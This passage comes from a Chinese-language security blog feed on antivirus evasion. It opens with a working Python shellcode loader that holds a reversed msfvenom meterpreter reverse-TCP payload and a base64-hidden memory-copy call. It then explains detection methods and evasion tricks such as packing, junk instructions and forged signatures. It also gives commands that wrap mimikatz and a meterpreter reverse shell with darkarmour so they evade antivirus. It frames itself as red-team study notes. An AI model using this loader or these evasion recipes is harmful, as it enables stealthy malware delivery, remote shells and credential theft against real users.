class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="loader-reverse-py"><a href="#loader-reverse-py" class="headerlink" title="loader_reverse.py"></a>loader_reverse.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="comment"># 此shellcode的值是反转后的值，从末尾开始读取</span></span><br><span class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=xx.xx.xx.xx LPORT=4441 -f raw | xxd -ps</span></span><br><span class="line">shellcode = <span class="string">&#x27;5dff652a5b0f2c7c949500a6857eff14f5bd579cff841cff941103140141a8148141201400418814814168140041a81400c120140cefbd13843e570cef00418814814168140041a81461c120f02e082c988400c12014bd1384bf570cefaa8f98940c1384e580e38ebca701359c06350d2ae786a243000000018e6514951495f5ef98943b576c92843c1084ffffff029eecff945dff16d4e657ab1495755dff03f0f2b0ab14a500a6851400000400869575148582d7008f38024c38845dfff58c9d20ab149f9884ad98840f98949c13d4056535fd98940000100089d8845dff5e354a85ab149c13842f988485140000010086951404a600001000e9d8c43d2a500a6f186f98e5024c3884000000d6e8f0008f385dfff58c9d20ab149f9884851440a69c13d42e988401ce3884000010f18e5e57ecff94a0470c585dff16475a99ab149f98842e98c4851401a67c98845dff0efdf0aeab141c98840cff842c98840cff840c13d49c13d40505e514a0a65dff00b60892ab14950000101086ae98c45dff706277c4ab141f98c44e98944514adfad27795110020cb945e98940000100ace18846e9894651400002333f5233777eb94d5ffffffb49e21b884a59514850eff251402ce3884a51495148514a595e5851485140d10848840b8140d1094c104b84484c0b814660d10944204b844858d571d93548042c430c41f570e831c1014cad09c1c140c13846d10848843b8149cff849c13d4653e0d10940204b8448184b8050d108476470c58840000008808b80000002758f020b0818718660d1084c324b80225b884151425de2e1c1014d09c1c1402c220c716c3ca0c13849c13d4a4a47bf0840527b8840225b8848125b8840625b88456652d1384152505141514000000cc8e0f4e3884cf&#x27;</span></span><br><span class="line"><span class="comment">#使用字符串切片将shellcode反转</span></span><br><span class="line">shellcode = shellcode[::-<span class="number">1</span>] </span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 将shellcode转为16进制</span></span><br><span class="line">shellcode = <span class="built_in">bytes</span>().fromhex(shellcode)</span><br><span class="line"><span class="comment">#将转义字符去掉\ 并取0位</span></span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#将shellcode转为字节类型</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment">#申请内存并设置该内存可读可写可执行</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 调用RtlMoveMemory函数从指定内存中复制内容至另一内存</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">string = <span class="string">&#x27;&#x27;&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KA0KICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLA0KICAgIGJ1ZiwNCiAgICBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpDQop&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(base64.b64decode(string))</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="关于如何查找到“特征码”"><a href="#关于如何查找到“特征码”" class="headerlink" title="关于如何查找到“特征码”"></a>关于如何查找到“特征码”</h2><p>也就是如何判断我们是哪部分代码被杀软检测到了呢？？如何定位特征码</p><p>我们可以注释部分代码，再编译为可执行文件，上传测试免杀，逐行代码的排查被查杀的代码在哪里！！</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>除了一些简单的静态查杀，有些杀软还会检测内存，检测监测系统敏感API，，监测用户敏感行为，恶意行为</p><p>还需要更加精进，保持进步</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用免杀工具</title>
      <link href="/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
      <url>/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/%E5%B8%B8%E7%94%A8%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀相关概念-简单概述"><a href="#免杀相关概念-简单概述" class="headerlink" title="免杀相关概念(简单概述)"></a>免杀相关概念(简单概述)</h1><blockquote><p>免杀技术全称为反杀毒技术 AV - Anti Anti-Virus 简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含<strong>反汇编、逆向工程、系统漏洞</strong>等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。  </p></blockquote><h2 id="技术分类"><a href="#技术分类" class="headerlink" title="技术分类"></a>技术分类</h2><ol><li>开源免杀：指在有病毒、木马<a href="https://baike.baidu.com/item/%E6%BA%90%E4%BB%A3%E7%A0%81?fromModule=lemma_inlink">源代码</a>的前提下，通过修改源代码进行免杀。</li><li>手工免杀：指在仅有病毒、木马的<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6?fromModule=lemma_inlink">可执行文件</a>(.exe)（PE文件）的情况下进行免杀</li><li>自动免杀：指的是<a href="https://zh.m.wikipedia.org/wiki/%E7%97%85%E6%AF%92">病毒</a>、木马自身能自动变异，如：千面人病毒</li></ol><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><blockquote><ul><li><a href="https://baike.baidu.com/item/%E5%85%8D%E6%9D%80">免杀</a></li><li><a href="https://zh.m.wikipedia.org/zh-hans/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF">免杀技术</a></li></ul></blockquote><h1 id="免杀测试环境"><a href="#免杀测试环境" class="headerlink" title="免杀测试环境"></a>免杀测试环境</h1><blockquote><p>Windows原生纯净镜像下载：<a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a><br>Windows 10激活密钥：W269N-WFGWX-YVC9B-4J6C9-T83GX<br>火绒：<a href="https://www.huorong.cn/person5.html">https://www.huorong.cn/person5.html</a><br>360安全卫士：<a href="https://weishi.360.cn/">https://weishi.360.cn/</a><br>360安全卫士极速版：<a href="https://weishi.360.cn/jisu/">https://weishi.360.cn/jisu/</a><br>tdm-gcc：<a href="https://jmeubank.github.io/tdm-gcc/download/">https://jmeubank.github.io/tdm-gcc/download/</a><br>mingw-w64：<a href="https://www.mingw-w64.org/downloads/">https://www.mingw-w64.org/downloads/</a> </p><blockquote><p>用的较多</p><ul><li><a href="https://www.mingw-w64.org/downloads/#msys2">https://www.mingw-w64.org/downloads/#msys2</a></li><li><a href="https://www.mingw-w64.org/downloads/#cygwin">https://www.mingw-w64.org/downloads/#cygwin</a></li></ul></blockquote><p>Visual Studio：<a href="https://visualstudio.microsoft.com/zh-hans/">https://visualstudio.microsoft.com/zh-hans/</a></p></blockquote><h1 id="常见查杀方式"><a href="#常见查杀方式" class="headerlink" title="常见查杀方式"></a>常见查杀方式</h1><blockquote><ul><li>静态查杀：对文件进行特征匹配的思路</li><li>云查杀：对文件内容及行为的检测</li></ul><blockquote><p>主要是观察敏感操作</p></blockquote><ul><li>动态查杀：对其产生的行为进行检测</li></ul></blockquote><h2 id="杀软检测技术介绍"><a href="#杀软检测技术介绍" class="headerlink" title="杀软检测技术介绍"></a>杀软检测技术介绍</h2><blockquote><p>每一类型的恶意软件所实施的反检测技术都是不一样的（恶意软件可以分为病毒、木马、僵尸程序、流氓软件、勒索软件、广告程序等）</p></blockquote><h3 id="基于签名的检测"><a href="#基于签名的检测" class="headerlink" title="基于签名的检测"></a>基于签名的检测</h3><blockquote><p>传统的防病毒软件很大程度上依赖于<strong>签名</strong>来识别恶意软件。</p><blockquote><p>如：微软官方工具SysinternalsSuite中具备官方签名：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209081442880.png" alt="image-20220908144213690" style="zoom:50%;" /></blockquote><p>工作原理如下：</p><p>当恶意软件被杀软公司采集后，杀软后台的研究人员以及动态分析系统便会对这些样本进行分析，一旦确定是恶意软件，后台便会提取恶意文件的标签并将其添加到反病毒软件的签名数据库中。</p></blockquote><h3 id="静态程序分析"><a href="#静态程序分析" class="headerlink" title="静态程序分析"></a>静态程序分析</h3><blockquote><p>静态程序分析是在不实际运行程序的情况下进行的分析。</p><p>大部份的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p></blockquote><h3 id="动态程序分析"><a href="#动态程序分析" class="headerlink" title="动态程序分析"></a>动态程序分析</h3><blockquote><p>动态程序分析是通过在真实或虚拟处理器上执行程序而执行的分析。为了使动态程序分析真实可信，我们必须要能够对各种目标程序的行为进行测试。</p></blockquote><h3 id="沙盒分析技术"><a href="#沙盒分析技术" class="headerlink" title="沙盒分析技术"></a>沙盒分析技术</h3><blockquote><p>沙盒是一个观察计算机病毒的重要环境，用于为一些来源不可信、具备破坏力或无法判定程序意图的程序提供试验环境。</p></blockquote><h3 id="启发式分析"><a href="#启发式分析" class="headerlink" title="启发式分析"></a>启发式分析</h3><blockquote><p>启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新的病毒变体。<br>启发式分析是<strong>基于专家的分析</strong>，利用它可以对已知或未知的恶意软件进行各种维度的风险衡量，其中多标准分析（MCA）是其中的方法之一，不过启发式分析不是统计分析而是基于可用的数据或统计。</p></blockquote><h3 id="信息熵检测"><a href="#信息熵检测" class="headerlink" title="信息熵检测"></a>信息熵检测</h3><blockquote><p>每个恶意软件都可以被描述成数值性质的属性(例如:信息熵)或者抽象性质的属性，信息熵就是通过找到最合适的量度来验证并且对比恶意软件的属性</p></blockquote><h3 id="其他常见检测技术"><a href="#其他常见检测技术" class="headerlink" title="其他常见检测技术"></a>其他常见检测技术</h3><h4 id="混淆检测"><a href="#混淆检测" class="headerlink" title="混淆检测"></a>混淆检测</h4><blockquote><p>病毒由两个部分组成：载荷（payload）和混淆部件（obfuscator），载荷是用来做坏事的代码，而混淆部件则是病毒用来保护自身免于被查杀的，通常恶意软件开发者都会将其代码进行混淆以降低其代码的可读性<br>所以混淆检测就非常的有针对性。</p></blockquote><h4 id="加壳检测"><a href="#加壳检测" class="headerlink" title="加壳检测"></a>加壳检测</h4><blockquote><p>恶意软件一般都会被压缩加壳，因为加壳会将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组合成单个可执行文件的一种手段。 当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩数据中重新创建原始代码。所以检测恶意软件是否使用了加壳技术，也是发现的一种重要手段。</p></blockquote><h4 id="加密检测"><a href="#加密检测" class="headerlink" title="加密检测"></a>加密检测</h4><blockquote><p>恶意软件使用加密对其二进制程序进行加密，以免被逆向分析。加密存在于恶意软件的构建器和存根中，当恶意软件需要解密时，不会用恶意代码常用的正常方法执行它。为了隐藏进程，恶意软件使用了一个有名的RunPE的技术，代码会以挂起的方式执行一个干净的进程（比如iexplorer.exe或者explorer.exe），然后把内存内容修改成恶意代码后再执行。所以检测RunPE的运行，就可以很容易的检测到恶意软件了。</p></blockquote><h2 id="常见杀软特点"><a href="#常见杀软特点" class="headerlink" title="常见杀软特点"></a>常见杀软特点</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>一般加壳，加资源，混淆都可绕过，不过火绒静态查杀更新的快，一般刚出的免杀，不久火绒就能查</p><h3 id="360"><a href="#360" class="headerlink" title="360"></a>360</h3><p>360要强一点，加壳不一定能绕，需要一些其他手段</p><h1 id="常见免杀方式"><a href="#常见免杀方式" class="headerlink" title="常见免杀方式"></a>常见免杀方式</h1><h2 id="特征码免杀"><a href="#特征码免杀" class="headerlink" title="特征码免杀"></a>特征码免杀</h2><blockquote><p>特征码: 特征码是识别一个程序是一个病毒的一段不大于64字节的特征串，简单来讲特征码就是一种只在病毒或木马文件内才有的独一无二的特征，它或是一段字符，或是在特定位置调用的一个函数。总之，如果某个文件具有这个特征码，那反病毒软件就会认为它是病毒。反过来，如果将这些特征码从病毒、木马的文件中抹去或破坏掉，那么反病毒软件就认为这是一个正常文件了。</p><p>免杀最基本思想就是破坏特征，这个特征可能是特征码，也可能是行为特征，只要破坏的病毒与木马所固有的特征，并保证其原本的功能没有改变，一次免杀就完成了</p><p>为了减少误报率,一般杀毒软件会提取多段特征串,这时,我们往往改一处就可达到免杀效果,当然有些杀毒软件要同时改几处才能免杀。</p></blockquote><h2 id="花指令免杀"><a href="#花指令免杀" class="headerlink" title="花指令免杀"></a>花指令免杀</h2><blockquote><p>花指令就是一段毫无意义的执行指令，也可以称为垃圾指令（类型加1减1之类的无用语句），花指令对程序的执行结果没有影响。在在静态查杀中，AV是靠特征码来判断文件是否有毒的。我们通过花指令让杀毒软件检测不到特征码，干扰杀毒软件正常的检测。加花以后，一些杀毒软件就检测不出来了，但是有些比较强的杀毒软件，病毒还是会被杀的。 </p><p>常见的就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其他常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响<a href="https://zh.m.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F">程序</a>的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</p><p>如杀毒软件本来是在 0x00001000  到 0x00005000  处找一个特征码。但因为我们填充了花指令，恶意代码跑到了 0x00008000  这个位置，就会导致特征码查杀失败，从而达到免杀目的。</p><p>花指令撰写方法：找到程序的一个全0代码段</p></blockquote><h2 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h2><blockquote><p>软件加壳为软件加密，对于现在的壳来说，根据作用与加壳后的不同效果，可以将其分为两类，一类是压缩壳，另一类是加密壳。但不管是<strong>压缩壳还是加密壳</strong>，它们的大致原理与执行流程都是一样的，应用程序加壳后就会变成PE文件里的一段数据，在执行加壳文件时会先执行壳，再由壳将已加密的程序解密并还原到内存中去</p><h3 id="加冷门壳"><a href="#加冷门壳" class="headerlink" title="加冷门壳"></a>加冷门壳</h3><blockquote><p>举例来说，如果说程序是一张烙饼，那壳就是包装袋，可以让你发现不了包装袋里的东西是什么。比较常见的壳一般容易被杀毒软件识别，所以加壳有时候会使用到生僻壳，就是不常用的壳。去买口香糖你会发现至少有两层包装，所以壳也可以加多重壳，让杀毒软件看不懂。如果你看到一个袋子上面写着干燥剂、有毒之类的字你也许就不会对他感兴趣了吧，这就是伪装壳，把一种壳伪装成其他壳，干扰杀毒软件正常的检测。</p></blockquote><h3 id="加壳改壳"><a href="#加壳改壳" class="headerlink" title="加壳改壳"></a>加壳改壳</h3><blockquote><p>加壳改壳是病毒免杀常用的手段之一，加壳改壳原理是将一个木马文件加上upx壳或者其它壳后用lordpe将文件<a href="https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9?fromModule=lemma_inlink">入口点</a>加1，然后将区段字符全部去掉，然后用od打开免杀的木马在入口上下100字符内修改一些代码让杀毒软件查不出来是什么壳就不知道怎么脱就可以实现免杀的目的，但这种技术只有熟悉汇编语言的人才会，这种免杀方法高效可以一口气过众多杀软也是免杀爱好者应该学会的一种技术。</p></blockquote><h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><blockquote><p>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</p><p>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。</p></blockquote></blockquote><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><blockquote><p>将 shellcode  和加载器分离</p><p>比如，一般杀软只会对 exe 文件进行查杀，但是我们将 shellcode 写入到图片中，那么杀软只会认为它是正常的图片，然后我们通过加载器将 shellcode 读取出来，加载进内存执行</p></blockquote><h2 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h2><blockquote><p>有些杀软会设置有扫描⽩名单，⽐如之前把程序图标替换为360安全卫⼠图标就能 过360的查杀。 </p><ul><li>加资源：使⽤ ResHacker 对⽂件进⾏资源操作，找来多个正常软件，将它们的资源加⼊到⾃⼰软件， </li><li>替换资源：使⽤ ResHacker 替换⽆⽤的资源（Version等）。 </li><li>加签名：使⽤签名伪造⼯具，将正常软件的签名信息加⼊到⾃⼰软件中。</li></ul></blockquote><h2 id="改程序入口点"><a href="#改程序入口点" class="headerlink" title="改程序入口点"></a>改程序入口点</h2><blockquote><p><a href="https://zh.m.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3%E7%82%B9">程序入口点</a>修改就是改变入口点，通常用到的方法是在入口点的地址加1或把入口点地址拆开，也有加花指令之后把原入口点修改到花指令的入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转<a href="https://zh.m.wikipedia.org/wiki/%E4%BB%A3%E7%A0%81">代码</a>，跳转到程序执行数据的入口点上，令程序正常运行。</p></blockquote><h2 id="免杀修改技巧——修改内存特征码："><a href="#免杀修改技巧——修改内存特征码：" class="headerlink" title="免杀修改技巧——修改内存特征码："></a>免杀修改技巧——修改内存特征码：</h2><blockquote><p>1.直接修改特征码的十六进制法</p><p>2.修改字符串大小写法</p><p>3.等价替换法</p><p>4.指令顺序调换法</p><p>5.通用跳转法</p></blockquote><h2 id="最新的无特征免杀法"><a href="#最新的无特征免杀法" class="headerlink" title="最新的无特征免杀法"></a>最新的无特征免杀法</h2><blockquote><p>何为无特征免杀法？就是脱离传统的定位方法，直接盲免，就对于整体区段进行异或加密，是整体代码发生变换，从而逃脱杀毒软件的查杀，是当今最流行的方法。 </p></blockquote><h1 id="darkarmour"><a href="#darkarmour" class="headerlink" title="darkarmour"></a>darkarmour</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><a href="https://github.com/bats3c/darkarmour">https://github.com/bats3c/darkarmour</a></p></blockquote><p>直接使用GitHub上面的恶意木马是会直接被查杀，文件落地就会被直接查杀。darkarmour直接从内存加载文件。从内存中存储和执行加密的 Windows 二进制文件，无需任何磁盘操作。木马在内存中加壳绕过静态检测。注意经由darkarmour加密的可执行文件，大概率是可过杀软的~~~应用范围更广</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>它使用 python标准库，因此无需担心任何 python 依赖项，因此您可能遇到的唯一问题是二进制依赖项。</p><ul><li>Linux下：（建议在linux上操作）</li></ul><blockquote><p> 所需的二进制文件是： i686-w64-mingw32-g++ 、 i686-w64-mingw32-gcc  和 upx（也可能是 osslsigncode ）。这些都可以通过apt安装</p></blockquote><ul><li>windows下：</li></ul><blockquote><p>mingw-w64前面有讲到的编译器</p></blockquote></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help 显示此帮助信息并退出</span><br><span class="line">-f FILE, --file FILE 要加密的文件，如果没有被告知，则假定为二进制文件</span><br><span class="line">-e ENCRYPT, --encrypt ENCRYPT 要使用的加密算法(xor),只有xor</span><br><span class="line">-S SHELLCODE, --shellcode SHELLCODE 包含shellcode的文件，需要 &quot;msfvenom -f raw&quot;的格式。</span><br><span class="line">-b, --binary 如果文件是二进制的exe文件，则提供。</span><br><span class="line">-d, --dll 使用反射性dll注入，在另一个进程中执行二进制文件</span><br><span class="line">-u, --upx 用upx打包可执行文件</span><br><span class="line">-j, --jmp 使用基于jmp的pe加载器，就是将可执行文件直接加载到内存</span><br><span class="line">-r, --runpe 使用runpe来加载pe</span><br><span class="line">-s, --source 如果文件是c源代码，则提供该文件。</span><br><span class="line">-k KEY, --key KEY 用于加密的密钥，如果没有提供，则随机生成。提供</span><br><span class="line">-l LOOP, --loop LOOP 加密级别的数量,循环加密的次数</span><br><span class="line">-o OUTFILE, --outfile OUTFILE 输出文件的名称，如果没有提供，则随机分配文件名 会被分配到</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.sohu.com/a/167142473_604699#:~:text=XOR%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E6%98%AF%3A%E5%BD%93%E4%B8%80%E4%B8%AA%E6%95%B0A%E5%92%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0B%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E4%BC%9A%E7%94%9F%E6%88%90%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0C%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%86%8D%E5%B0%86C%E5%92%8CB%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E5%88%99C%E5%8F%88%E4%BC%9A%E8%BF%98%E5%8E%9F%E4%B8%BAA%E3%80%82,%E7%9B%B8%E5%AF%B9%E4%BA%8E%E5%85%B6%E4%BB%96%E7%9A%84%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%EF%BC%8CXOR%E7%AE%97%E6%B3%95%E7%9A%84%E4%BC%98%E7%82%B9%E5%A6%82%E4%B8%8B%E3%80%82%20%281%29%E7%AE%97%E6%B3%95%E7%AE%80%E5%8D%95%EF%BC%8C%E5%AF%B9%E4%BA%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E5%BE%88%E5%AE%B9%E6%98%93%E8%83%BD%E5%AE%9E%E7%8E%B0%E3%80%82">简易的加密算法——XOR 加密</a></p></blockquote><h2 id="实战免杀mimikatz"><a href="#实战免杀mimikatz" class="headerlink" title="实战免杀mimikatz"></a>实战免杀mimikatz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python darkarmour.py -f mimikatz.exe -j -l 5 -e xor -o darkmeter.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#加壳</span><br><span class="line">upx darkmeter.exe</span><br><span class="line">#darkmeter.exe就是被包裹后的mimkatz，能过免杀，如果失败也不要气馁，免杀失败很正常，可以试一试将loop次数提高或者减少</span><br></pre></td></tr></table></figure><h2 id="实战MSF免杀"><a href="#实战MSF免杀" class="headerlink" title="实战MSF免杀"></a>实战MSF免杀</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4001 -f exe -o 4001.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.58.133 -P 4001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python darkarmour.py -f 4001.exe -j -l 6 -e xor -o dark4001.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upx dark4001.exe</span><br></pre></td></tr></table></figure><h1 id="掩日-适用于红队的综合免杀工具"><a href="#掩日-适用于红队的综合免杀工具" class="headerlink" title="掩日 - 适用于红队的综合免杀工具"></a>掩日 - 适用于红队的综合免杀工具</h1><p>图形化工具</p><blockquote><p><a href="https://github.com/1y0n/AV_Evasion_Tool">AV_Evasion_Tool</a></p></blockquote><h1 id="免杀学习（强烈推荐）"><a href="#免杀学习（强烈推荐）" class="headerlink" title="免杀学习（强烈推荐）"></a>免杀学习（强烈推荐）</h1><blockquote><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p></blockquote><p>把这些项目都做一遍~~无敌</p><h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p><p>简单理解就是：shellcode是一段执行某些动作的机器码。</p><p>在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码。</p><p>需要注意到的是，shellcode可以在内存中直接执行某些操作，比如说让我们上线到cs，上线到msf，这些都是shellcode在内存中做的事</p><blockquote><p><a href="https://www.cnblogs.com/DeeLMind/p/6856133.html">ShellCode入门（提取ShellCode）</a></p></blockquote><h1 id="shellcode-launch"><a href="#shellcode-launch" class="headerlink" title="shellcode-launch"></a>shellcode-launch</h1><blockquote><p>加载shellcode的  </p></blockquote><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><blockquote><p><a href="https://github.com/jax777/shellcode-launch">https://github.com/jax777/shellcode-launch</a></p></blockquote><h2 id="安装GO环境"><a href="#安装GO环境" class="headerlink" title="安装GO环境"></a>安装GO环境</h2><blockquote><p>跨平台</p></blockquote><h3 id="Go-安装"><a href="#Go-安装" class="headerlink" title="Go 安装"></a>Go 安装</h3><blockquote><ul><li>GO  下载页面：<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></li><li>Go  安装的目录路径：D:\Program Files\Go</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#go env查看</span></span><br><span class="line">GOROOT=D:\Program Files\Go</span><br></pre></td></tr></table></figure></blockquote><h3 id="Go-环境配置"><a href="#Go-环境配置" class="headerlink" title="Go 环境配置"></a>Go 环境配置</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 Go 环境变量</span></span><br><span class="line">go env</span><br><span class="line"><span class="comment"># 设置 Go 环境变量</span></span><br><span class="line">go env <span class="literal">-w</span> GO111MODULE=auto</span><br></pre></td></tr></table></figure><h3 id="GOPATH"><a href="#GOPATH" class="headerlink" title="GOPATH"></a>GOPATH</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setx命令：在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。</span></span><br><span class="line"><span class="comment">#使用/M表示在系统写入，不/M表示写入用户变量</span></span><br><span class="line"><span class="comment">#格式： SETX [/S system [/U [domain\]user [/P [password]]]] var value [/M]</span></span><br><span class="line"><span class="comment">#主要是是var和value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码编写位置（管理员权限）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span> /M</span><br><span class="line"><span class="comment">#若被拒绝：（不过这样仅仅是写入用户变量）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span></span><br><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx /M PATH <span class="string">&quot;<span class="variable">$Env:PATH</span>;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span></span><br><span class="line"><span class="comment">#注意哦，使用setx一定要谨慎，</span></span><br><span class="line"><span class="comment">#如果是在环境变量后面追加值，一定不要忘记带上原变量，否则我们会覆盖掉原变量，而失去原变量。如果要追加在后面的话，一定要:</span></span><br><span class="line">setx /M PATH <span class="string">&quot;<span class="variable">$Env:PATH</span>;&lt;path to add&gt;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>注：若是出现截断的情况，建议手动添加环境变量</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112048354.png" alt="image-20220911204822039"></p></blockquote><p>在 GOPATH  目录下新建三个文件夹</p><ul><li>src 